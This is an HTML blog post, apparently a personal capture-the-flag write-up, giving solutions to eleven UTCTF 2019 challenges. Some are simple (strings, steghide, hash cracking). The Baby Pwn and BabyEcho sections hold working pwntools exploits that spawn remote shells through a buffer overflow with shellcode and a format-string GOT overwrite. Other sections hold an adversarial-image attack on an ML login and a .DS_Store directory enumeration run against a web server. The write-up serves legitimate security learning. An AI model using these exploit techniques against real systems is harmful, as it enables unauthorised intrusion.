@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="https://tcode2k16.github.io/blog/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="UTCTF 2019 Writeup"/>
+  <meta name="twitter:description" content="My solves for UTCTF 2019 challenges"/>
+  
+    <meta name="twitter:site" content="@tcode2k16"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Alan Chang"/>
+  
+
+
+
+		
+		<meta name="author" content="Alan Chang">
+		<meta name="description" content="a random blog about cybersecurity and programming">
+		<meta name="generator" content="Hugo 0.51" />
+		<title>UTCTF 2019 Writeup &middot; Alan&#39;s Blog</title>
+		<link rel="shortcut icon" href="https://tcode2k16.github.io/blog/images/favicon.ico">
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/style.css">
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/font-awesome.min.css">
+		
+
+		
+		<link href="https://tcode2k16.github.io/blog/index.xml" rel="alternate" type="application/rss+xml" title="Alan&#39;s Blog" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://tcode2k16.github.io/blog/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://tcode2k16.github.io/blog/posts'>Archive</a>
+	<a href='https://tcode2k16.github.io/blog/tags'>Tags</a>
+	<a href='https://tcode2k16.github.io/blog/about'>About</a>
+
+	
+
+	
+	<a class="cta" href="https://tcode2k16.github.io/blog/index.xml">Subscribe</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        UTCTF 2019 Writeup
+                    </h1>
+                    <h2 class="headline">
+                    Mar 11, 2019 08:28
+                    · 1454 words
+                    · 7 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/ctf">ctf</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/cyber-security">cyber-security</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/write-up">write-up</a>
+                          
+                              <a href="https://tcode2k16.github.io/blog/tags/machine-learning">machine-learning</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li><a href="#basics-re-100pts">[basics] re - 100pts</a>
+<ul>
+<li><a href="#problem">Problem</a></li>
+<li><a href="#solution">Solution</a></li>
+</ul></li>
+<li><a href="#simple-python-script-750pts">simple python script - 750pts</a>
+<ul>
+<li><a href="#problem-1">Problem</a></li>
+<li><a href="#solution-1">Solution</a></li>
+</ul></li>
+<li><a href="#habbydabby-s-secret-stash-650pts">HabbyDabby&rsquo;s Secret Stash - 650pts</a>
+<ul>
+<li><a href="#problem-2">Problem</a></li>
+<li><a href="#solution-2">Solution</a></li>
+</ul></li>
+<li><a href="#basics-crypto-200pts">[basics] crypto - 200pts</a>
+<ul>
+<li><a href="#problem-3">Problem</a></li>
+<li><a href="#solution-3">Solution</a></li>
+</ul></li>
+<li><a href="#jacobi-s-chance-encryption-750pts">Jacobi&rsquo;s Chance Encryption - 750pts</a>
+<ul>
+<li><a href="#problem-4">Problem</a></li>
+<li><a href="#solution-4">Solution</a></li>
+</ul></li>
+<li><a href="#basics-forensics-100pts">[basics] forensics - 100pts</a>
+<ul>
+<li><a href="#problem-5">Problem</a></li>
+<li><a href="#solution-5">Solution</a></li>
+</ul></li>
+<li><a href="#facesafe-1400pts">FaceSafe - 1400pts</a>
+<ul>
+<li><a href="#problem-6">Problem</a></li>
+<li><a href="#solution-6">Solution</a></li>
+</ul></li>
+<li><a href="#baby-pwn-650pts">Baby Pwn - 650pts</a>
+<ul>
+<li><a href="#problem-7">Problem</a></li>
+<li><a href="#solution-7">Solution</a></li>
+</ul></li>
+<li><a href="#babyecho-700pts">BabyEcho - 700pts</a>
+<ul>
+<li><a href="#problem-8">Problem</a></li>
+<li><a href="#solution-8">Solution</a></li>
+</ul></li>
+<li><a href="#utctf-adventure-rom-1000pts">UTCTF adventure ROM - 1000pts</a>
+<ul>
+<li><a href="#problem-9">Problem</a></li>
+<li><a href="#solution-9">Solution</a></li>
+</ul></li>
+<li><a href="#low-sodium-bagel-300pts">Low Sodium Bagel - 300pts</a>
+<ul>
+<li><a href="#problem-10">Problem</a></li>
+<li><a href="#solution-10">Solution</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    
+
+<h1 id="basics-re-100pts">[basics] re - 100pts</h1>
+
+<h2 id="problem">Problem</h2>
+
+<p>I know there&rsquo;s a string in this binary somewhere&hellip;. Now where did I leave it?</p>
+
+<p>by balex</p>
+
+<p><a href="/blog/2019-03-11-utctf-writeup/re/calculator">calculator</a></p>
+
+<h2 id="solution">Solution</h2>
+
+<pre><code>❯ strings calculator | grep flag
+utflag{str1ng5_15_4_h4ndy_t00l}
+</code></pre>
+
+<p>flag: <code>utflag{str1ng5_15_4_h4ndy_t00l}</code></p>
+
+<h1 id="simple-python-script-750pts">simple python script - 750pts</h1>
+
+<h2 id="problem-1">Problem</h2>
+
+<p>simple python script I wrote while not paying attention in graphics</p>
+
+<p>by asper</p>
+
+<p><a href="/blog/2019-03-11-utctf-writeup/simple python script/wtf.py">wtf.py</a></p>
+
+<h2 id="solution-1">Solution</h2>
+
+<p><code>inputs</code> contains five sha1 hashes. You can get the hashes by adding a print statement in the source code.</p>
+
+<p>Crack the hashes using a website:</p>
+
+<pre><code>
+# 26d33687bdb491480087ce1096c80329aaacbec7 SHA1 puppy 
+# 1C3BCF656687CD31A3B486F6D5936C4B76A5D749 SHA1 p1zza 
+# 11A3E059C6F9C223CE20EF98290F0109F10B2AC6 SHA1 anime 
+# 6301CB033554BF0E424F7862EFCC9D644DF8678D SHA1 torus 
+# 95d79f53b52da1408cc79d83f445224a58355b13 SHA1 kitty 
+</code></pre>
+
+<p>Concatenate the strings and you get the flag.</p>
+
+<p>flag: <code>puppyp1zzaanimetoruskitty</code></p>
+
+<h1 id="habbydabby-s-secret-stash-650pts">HabbyDabby&rsquo;s Secret Stash - 650pts</h1>
+
+<h2 id="problem-2">Problem</h2>
+
+<p>HabbyDabby&rsquo;s hidden some stuff away on his web server that he created and wrote from scratch on his Mac. See if you can find out what he&rsquo;s hidden and where he&rsquo;s hidden it!</p>
+
+<p><a href="http://a.goodsecurity.fail/">http://a.goodsecurity.fail/</a></p>
+
+<p>by copperstick6</p>
+
+<h2 id="solution-2">Solution</h2>
+
+<p>The challenge description mentions that the website is made using a Mac; therefore, we can look for <code>.DS_Store</code> files. I used <a href="https://github.com/lijiejie/ds_store_exp">this project</a> on github to reveal the path for the flag:</p>
+
+<pre><code>❯ python ds_store_exp.py http://a.goodsecurity.fail/\?file\=.DS_Store
+[+] http://a.goodsecurity.fail/?file=.DS_Store
+[+] http://a.goodsecurity.fail/?file=a
+[+] http://a.goodsecurity.fail/?file=e/.DS_Store
+ [+] http://a.goodsecurity.fail/?file=d
+[+] http://a.goodsecurity.fail/?file=a/.DS_Store
+[+] http://a.goodsecurity.fail/?file=index.html
+[+] http://a.goodsecurity.fail/?file=d/.DS_Store
+ [+] http://a.goodsecurity.fail/?file=index.html/.DS_Store
+[+] http://a.goodsecurity.fail/?file=c
+[+] http://a.goodsecurity.fail/?file=e
+[+] http://a.goodsecurity.fail/?file=c/.DS_Store
+[+] http://a.goodsecurity.fail/?file=b
+[+] http://a.goodsecurity.fail/?file=b/.DS_Store
+[+] http://a.goodsecurity.fail/?file=e/a/.DS_Store
+[+] http://a.goodsecurity.fail/?file=e/c
+[+] http://a.goodsecurity.fail/?file=e/b/.DS_Store
+ [+] http://a.goodsecurity.fail/?file=e/b
+ [+] http://a.goodsecurity.fail/?file=e/c/.DS_Store
+[+] http://a.goodsecurity.fail/?file=e/e
+[+] http://a.goodsecurity.fail/?file=e/a
+[+] http://a.goodsecurity.fail/?file=e/e/.DS_Store
+[+] http://a.goodsecurity.fail/?file=e/d
+[+] http://a.goodsecurity.fail/?file=e/d/.DS_Store
+[+] http://a.goodsecurity.fail/?file=e/d/b
+[+] http://a.goodsecurity.fail/?file=e/d/b/.DS_Store
+[+] http://a.goodsecurity.fail/?file=e/d/e
+[+] http://a.goodsecurity.fail/?file=e/d/e/.DS_Store
+[+] http://a.goodsecurity.fail/?file=e/d/e/flag.txt/.DS_Store
+ [+] http://a.goodsecurity.fail/?file=e/d/e/flag.txt
+</code></pre>
+
+<p>Side note: The code from the repo didn&rsquo;t work for me at first, and I have comment out this part:</p>
+
+<pre><code class="language-python">if not os.path.exists(folder_name):
+  os.makedirs(folder_name)
+with open(netloc.replace(':', '_') + path, 'wb') as outFile:
+  self.lock.acquire()
+  print '[+] %s' % url
+  self.lock.release()
+  outFile.write(data)
+</code></pre>
+
+<p>Now with the path, we can get the flag:</p>
+
+<pre><code>❯ curl http://a.goodsecurity.fail/\?file\=e/d/e/flag.txt
+utflag{mac_os_hidden_files_are_stupid}
+</code></pre>
+
+<p>flag: <code>utflag{mac_os_hidden_files_are_stupid}</code></p>
+
+<h1 id="basics-crypto-200pts">[basics] crypto - 200pts</h1>
+
+<h2 id="problem-3">Problem</h2>
+
+<p>Can you make sense of this file?</p>
+
+<p>by balex</p>
+
+<p><a href="/blog/2019-03-11-utctf-writeup/crypto/binary.txt">binary.txt</a></p>
+
+<h2 id="solution-3">Solution</h2>
+
+<p>Basic crypto&hellip;</p>
+
+<pre><code class="language-python">from pwn import *
+with open('./binary.txt') as f:
+  data = f.read()
+
+data = unbits(data.strip().replace(' ', ''))
+print data
+
+print '--------------------------------'
+
+data = data.split('one.)\n')[-1]
+data = data.decode('base64') 
+print data
+
+print '--------------------------------'
+
+data = data.split('n people).\n')[-1]
+
+# https://stackoverflow.com/questions/3269686/short-rot13-function-python
+def rot(n):
+  from string import ascii_lowercase as lc, ascii_uppercase as uc, maketrans
+  lookup = maketrans(lc + uc, lc[n:] + lc[:n] + uc[n:] + uc[:n])
+  return lambda s: s.translate(lookup)
+
+# for i in range(26):
+#   print '{}: {}'.format(i, rot(i)(data))
+
+data = rot(16)(data)
+print data
+
+print '--------------------------------'
+
+# https://www.guballa.de/substitution-solver
+# congratulations! you have finished the beginner cryptography challenge. here is a flag for all your hard efforts: utflag{3ncrypt10n_15_c00l}. you will find that a lot of cryptography is just building off this sort of basic knowledge, and it really is not so bad after all. hope you enjoyed the challenge!
+</code></pre>
+
+<p>flag: <code>utflag{3ncrypt10n_15_c00l}</code></p>
+
+<h1 id="jacobi-s-chance-encryption-750pts">Jacobi&rsquo;s Chance Encryption - 750pts</h1>
+
+<h2 id="problem-4">Problem</h2>
+
+<p>Public Key <code>569581432115411077780908947843367646738369018797567841</code></p>
+
+<p>Can you decrypt Jacobi&rsquo;s encryption?</p>
+
+<pre><code class="language-python">def encrypt(m, pub_key):
+
+    bin_m = ''.join(format(ord(x), '08b') for x in m)
+    n, y = pub_key
+
+    def encrypt_bit(bit):
+        x = randint(0, n)
+        if bit == '1':
+            return (y * pow(x, 2, n)) % n
+        return pow(x, 2, n)
+
+    return map(encrypt_bit, bin_m)
+</code></pre>
+
+<p>by asper</p>
+
+<p><a href="/blog/2019-03-11-utctf-writeup/Jacobis Chance Encryption/flag.enc">flag.enc</a></p>
+
+<h2 id="solution-4">Solution</h2>
+
+<p>Looking at the <code>encrypt</code> function, <code>(y * pow(x, 2, n)) % n</code> is more likely to be <code>1</code> and <code>pow(x, 2, n)</code> is more likely to be <code>0</code>. Using this we can write a script to extract the message:</p>
+
+<pre><code class="language-python"># https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR_Brute_Force(1,100,0,'Standard',false,true,false,'flag')&amp;input=OGE4Yjk5OTM5ZTk4ODQ5Yjk2OWJhMDhhYTA4ZjllODZhMDllOGI4YjlhOTE4Yjk2OTA5MWEwOTY5MWEwOTE4YTkyOWQ5YThkYTA4Yjk3OWE5MDhkODY4Mjgw
+from pwn import *
+# pub_key = '569581432115411077780908947843367646738369018797567841'
+
+def encrypt(m, pub_key):
+
+    bin_m = ''.join(format(ord(x), '08b') for x in m)
+    n, y = pub_key
+
+    def encrypt_bit(bit):
+        x = randint(0, n)
+        if bit == '1':
+            return (y * pow(x, 2, n)) % n
+        return pow(x, 2, n)
+
+    return map(encrypt_bit, bin_m)
+
+def decrypt(m):
+  output = ''
+  for e in m.strip().split(','):
+    if e == '0':
+      output += '0'
+    else:
+      output += '1'
+  return unbits(output)
+
+print decrypt(open('./flag.enc').read()).encode('hex')
+</code></pre>
+
+<pre><code>❯ python chal.py
+8a8b99939e98849b969ba08aa08f9e86a09e8b8b9a918b969091a09691a0918a929d9a8da08b979a908d868280
+</code></pre>
+
+<p>This did not give us the flag; however, the bytes look like the result of a xor operation.</p>
+
+<p>I used cyberchef to brute force the xor key and got the flag:</p>
+
+<blockquote>
+<p><a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR_Brute_Force(1,100,0,'Standard',false,true,false,'flag')&amp;input=OGE4Yjk5OTM5ZTk4ODQ5Yjk2OWJhMDhhYTA4ZjllODZhMDllOGI4YjlhOTE4Yjk2OTA5MWEwOTY5MWEwOTE4YTkyOWQ5YThkYTA4Yjk3OWE5MDhkODY4Mjgw">https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR_Brute_Force(1,100,0,'Standard',false,true,false,'flag')&amp;input=OGE4Yjk5OTM5ZTk4ODQ5Yjk2OWJhMDhhYTA4ZjllODZhMDllOGI4YjlhOTE4Yjk2OTA5MWEwOTY5MWEwOTE4YTkyOWQ5YThkYTA4Yjk3OWE5MDhkODY4Mjgw</a></p>
+</blockquote>
+
+<p>flag: <code>utflag{did_u_pay_attention_in_number_theory}</code></p>
+
+<h1 id="basics-forensics-100pts">[basics] forensics - 100pts</h1>
+
+<h2 id="problem-5">Problem</h2>
+
+<p>My friend said they hid a flag in this picture, but it&rsquo;s broken!</p>
+
+<p>by balex</p>
+
+<p><a href="/blog/2019-03-11-utctf-writeup/forensics/secret.jpg">secret.jpg</a></p>
+
+<h2 id="solution-5">Solution</h2>
+
+<p>The file is a text file instead of a image:</p>
+
+<pre><code>❯ file secret.jpg
+secret.jpg: ASCII text
+
+❯ cat secret.jpg
+utflag{d0nt_tru5t_f1l3_3xt3ns10n5}
+</code></pre>
+
+<p>flag: <code>utflag{d0nt_tru5t_f1l3_3xt3ns10n5}</code></p>
+
+<h1 id="facesafe-1400pts">FaceSafe - 1400pts</h1>
+
+<h2 id="problem-6">Problem</h2>
+
+<p>Can you get the secret? <a href="http://facesafe.xyz">http://facesafe.xyz</a></p>
+
+<p>Like any startup nowadays, FaceSafe had to get on the MACHINELEARNING™ train. Also, like any other startup, they may have been too careless about exposing their website metadata&hellip;</p>
+
+<p>Hint: MACHINELEARNING™ logic: if it looks like noise, swims like noise, and quacks like noise, then it&rsquo;s probably&hellip; a deer?</p>
+
+<p>written by patil215</p>
+
+<h2 id="solution-6">Solution</h2>
+
+<p>First, I found the <code>robots.txt</code> page:</p>
+
+<pre><code>❯ curl http://facesafe.xyz/robots.txt
+User-agent: *
+Disallow: /api/model/auth
+Disallow: /api/model/check
+Disallow: /api/model/expose
+Disallow: /api/model/infer
+Disallow: /api/model/model_metadata.json
+Disallow: /api/model/model.model
+Disallow: /static/event.png
+Disallow: /static/find.png
+Disallow: /static/bad.png
+</code></pre>
+
+<p>Then, I downloaded the <a href="/blog/2019-03-11-utctf-writeup/FaceSafe/model.model">ML model</a></p>
+
+<p>From this point onward, it&rsquo;s basically the same as the <a href="/blog/posts/2019-02-03-nullcon-hackim-writeup/#mlauth">mlAuth in nullcon HackIM 2019</a> and <a href="/blog/posts/picoctf-2018-writeup/general-skills/#dog-or-frog">Dog or Frog in PicoCTF 2018</a>.</p>
+
+<p>Here is solution code:</p>
+
+<pre><code class="language-python">from keras.applications.mobilenet import preprocess_input
+from keras.models import load_model
+from keras.preprocessing.image import img_to_array, array_to_img
+from PIL import Image
+from imagehash import phash
+import numpy as np
+from keras import backend as K
+
+IMAGE_DIMS = (32, 32)
+GOAL_IND = 4
+img_path = './black.png'
+
+
+model = load_model('./model.model')
+model.summary()
+
+def prepare_image(image, target=IMAGE_DIMS):
+    # if the image mode is not RGB, convert it
+    if image.mode != &quot;RGB&quot;:
+        image = image.convert(&quot;RGB&quot;)
+
+    # resize the input image and preprocess it
+    image = image.resize(target)
+    image = img_to_array(image)
+    image = np.expand_dims(image, axis=0)
+    image = preprocess_input(image)
+    # return the processed image
+    return image
+
+original_image = Image.open(img_path).resize(IMAGE_DIMS)
+original_image = prepare_image(original_image)
+hacked_image = np.copy(original_image)
+
+
+model_input_layer = model.layers[0].input
+model_output_layer = model.layers[-1].output
+
+cost_function = model_output_layer[0][GOAL_IND]
+gradient_function = K.gradients(cost_function, model_input_layer)[0]
+grab_cost_and_gradients_from_model = K.function([model_input_layer, K.learning_phase()], [cost_function, gradient_function])
+
+learning_rate = 0.1
+cost = 0.0
+
+while cost &lt; 0.65:
+    cost, gradients = grab_cost_and_gradients_from_model([hacked_image, 0])
+
+    hacked_image += np.sign(gradients) * learning_rate
+
+    hacked_image = np.clip(hacked_image, -1.0, 1.0)
+
+    print(&quot;value: {:.8}%&quot;.format(cost * 100))
+
+hacked_image = hacked_image.reshape((32,32,3))
+img = array_to_img(hacked_image)
+img.save('./hacked.png')
+</code></pre>
+
+<p>And here is the final image:</p>
+
+<p><img style="image-rendering: pixelated;image-rendering: -moz-crisp-edges;image-rendering: crisp-edges;" src="/blog/2019-03-11-utctf-writeup/FaceSafe/hacked.png"/></p>
+
+<p>flag: <code>utflag{n3ur4l_n3t_s3cur1ty_b4d_p4d1ct4b1l1ty}</code></p>
+
+<h1 id="baby-pwn-650pts">Baby Pwn - 650pts</h1>
+
+<h2 id="problem-7">Problem</h2>
+
+<p><code>nc stack.overflow.fail 9000</code></p>
+
+<p>by hk</p>
+
+<p><a href="/blog/2019-03-11-utctf-writeup/Baby Pwn/babypwn">babypwn</a></p>
+
+<h2 id="solution-7">Solution</h2>
+
+<p>Standard pwn challenge. Write shellcode to <code>.bss</code> and jump there using the buffer overflow.</p>
+
+<p>Here&rsquo;s the script:</p>
+
+<pre><code class="language-python">from pwn import *
+import sys
+argv = sys.argv
+
+DEBUG = True
+BINARY = './babypwn'
+
+context.binary = BINARY
+
+if DEBUG:
+  context.log_level = 'debug'
+
+if len(argv) &lt; 2:
+  stdout = process.PTY
+  stdin = process.PTY
+
+  sh = process(BINARY, stdout=stdout, stdin=stdin)
+else:
+  sh = remote('stack.overflow.fail', 9000)
+
+name_addr = 0x601080
+
+sh.sendlineafter('?\n', asm(shellcraft.amd64.linux.sh()))
+
+sh.sendlineafter(': ', '+')
+
+sh.sendlineafter(': ', '1')
+
+payload = 'a'*(0x90-1)+'+'+p64(name_addr)*2
+
+sh.sendlineafter(': ', payload)
+
+sh.interactive()
+</code></pre>
+
+<p>flag: <code>utflag{0h_n0_i_f0rg0t_t0_carry_the_return}</code></p>
+
+<h1 id="babyecho-700pts">BabyEcho - 700pts</h1>
+
+<h2 id="problem-8">Problem</h2>
+
+<p>I found this weird echo server. Can you find a vulnerability?</p>
+
+<p><code>nc stack.overflow.fail 9002</code></p>
+
+<p>by jitterbug_gang</p>
+
+<p><a href="/blog/2019-03-11-utctf-writeup/BabyEcho/pwnable">pwnable</a></p>
+
+<h2 id="solution-8">Solution</h2>
+
+<p>Standard format string attack. The script is pretty self explanatory:</p>
+
+<pre><code class="language-python">from pwn import *
+import sys
+argv = sys.argv
+
+DEBUG = True
+BINARY = './pwnable'
+
+context.binary = BINARY
+
+if DEBUG:
+  context.log_level = 'debug'
+
+if len(argv) &lt; 2:
+  stdout = process.PTY
+  stdin = process.PTY
+
+  sh = process(BINARY, stdout=stdout, stdin=stdin)
+else:
+  sh = remote('stack.overflow.fail', 9002)
+
+printf_got = 0x804a010
+exit_got = 0x804a01c
+fgets_got = 0x804a014
+
+main_addr = 0x0804851b
+
+payload = 'A'*2
+payload += p32(printf_got)
+payload += p32(exit_got)
+
+
+
+payload += '%11$n'
+pause()
+
+# stage 1: loop
+p1 = 'A'*2
+p1 += p32(exit_got)
+p1 += p32(exit_got+2)
+p1 += '%{}x'.format(0x851b-10)
+p1 += '%11$hn'
+p1 += '%{}x'.format((0x10000-(0x851b))+0x0804)
+p1 += '%12$hn'
+sh.sendlineafter('.\n', p1)
+
+# stage 2: find libc version
+# https://libc.blukat.me/?q=_IO_printf%3A020%2C_IO_fgets%3A620&amp;l=libc6-i386_2.23-0ubuntu11_amd64
+# p2 = 'A'*2
+# p2 += p32(printf_got)
+# p2 += '%11$s'
+
+# sh.sendlineafter('.\n', p2)
+
+# print hex(u32(sh.recvuntil('back').split('\n')[0][6:6+4])) #0xf7dd4020
+
+# p2 = 'A'*2
+# p2 += p32(fgets_got)
+# p2 += '%11$s'
+
+# sh.sendlineafter('.\n', p2)
+
+# print hex(u32(sh.recvuntil('back').split('\n')[0][6:6+4])) #0xf7de8620
+
+# stage 3: leak libc base and find system
+
+p3 = 'A'*2
+p3 += p32(printf_got)
+p3 += '%11$s'
+
+sh.sendlineafter('.\n', p3)
+
+libc_base = u32(sh.recvuntil('back').split('\n')[0][6:6+4]) - 0x049020
+system_addr = libc_base + 0x03a940
+
+# stage 4: change prinf to system and win
+p1 = 'A'*2
+p1 += p32(printf_got)
+p1 += p32(printf_got+2)
+p1 += '%{}x'.format((system_addr&amp;0xffff)-10)
+p1 += '%11$hn'
+p1 += '%{}x'.format((0x10000-(system_addr&amp;0xffff))+(system_addr &gt;&gt; 16))
+p1 += '%12$hn'
+sh.sendlineafter('.\n', p1)
+
+sh.sendlineafter('.\n', '/bin/sh')
+
+sh.interactive()
+</code></pre>
+
+<p>flag: <code>utflag{gassssssssssp3r_mad3_m3_wr1t3_th1s}</code></p>
+
+<h1 id="utctf-adventure-rom-1000pts">UTCTF adventure ROM - 1000pts</h1>
+
+<h2 id="problem-9">Problem</h2>
+
+<p>D-Pad to move</p>
+
+<p>A to select</p>
+
+<p>See if you can win!</p>
+
+<p>Be careful, there are invisible lines that kill you</p>
+
+<p>by asper</p>
+
+<p><a href="/blog/2019-03-11-utctf-writeup/UTCTF adventure ROM/hack.gb">hack.gb</a></p>
+
+<h2 id="solution-9">Solution</h2>
+
+<p>Running the game in <code>OpenEmu</code> looks like this:</p>
+
+<p><img style="image-rendering: pixelated;image-rendering: -moz-crisp-edges;image-rendering: crisp-edges;" src="/blog/2019-03-11-utctf-writeup/UTCTF adventure ROM/screen.png"/></p>
+
+<p>The player have to move around avoiding invisible blocks and go to the four corners in the correct order.</p>
+
+<p>I utilized the saves feature in OpenEmu and brute forced the sequence by hand.</p>
+
+<p>flag: <code>aabdcacbbdbcdcad</code></p>
+
+<h1 id="low-sodium-bagel-300pts">Low Sodium Bagel - 300pts</h1>
+
+<h2 id="problem-10">Problem</h2>
+
+<p>I brought you a bagel, see if you can find the secret ingredient.</p>
+
+<p>by balex</p>
+
+<p><a href="/blog/2019-03-11-utctf-writeup/Low Sodium Bagel/low-sodium-bagel.jpeg">low-sodium-bagel.jpeg</a></p>
+
+<h2 id="solution-10">Solution</h2>
+
+<p>Simple challenge where you have to extract the flag using steghide:</p>
+
+<pre><code>$ steghide extract -sf low-sodium-bagel.jpeg -p &quot;&quot;
+wrote extracted data to &quot;steganopayload4837.txt&quot;.
+$ cat steganopayload4837.txt
+utflag{b1u3b3rry_b4g3ls_4r3_th3_b3st}
+</code></pre>
+
+<p>flag: <code>utflag{b1u3b3rry_b4g3ls_4r3_th3_b3st}</code></p>
+
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=https%3a%2f%2ftcode2k16.github.io%2fblog%2fposts%2f2019-03-11-utctf-writeup%2f - UTCTF%202019%20Writeup by @tcode2k16"><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'github-blog-14'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+        <div id="social">
+
+	
+	
+    <a class="symbol" href="https://www.github.com/tcode2k16">
+        <i class="fa fa-github-square"></i>
+    </a>
+    
+    <a class="symbol" href="https://twitter.com/tcode2k16">
+        <i class="fa fa-twitter-square"></i>
+    </a>
+    
+
+
+</div>
+
+    
+    <p class="small">
+    
+       © Copyright 2019 <i class="fa fa-heart" aria-hidden="true"></i> Alan Chang
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://tcode2k16.github.io/blog/js/jquery-3.3.1.min.js"></script>
+<script src="https://tcode2k16.github.io/blog/js/main.js"></script>
+<script src="https://tcode2k16.github.io/blog/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-88069322-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
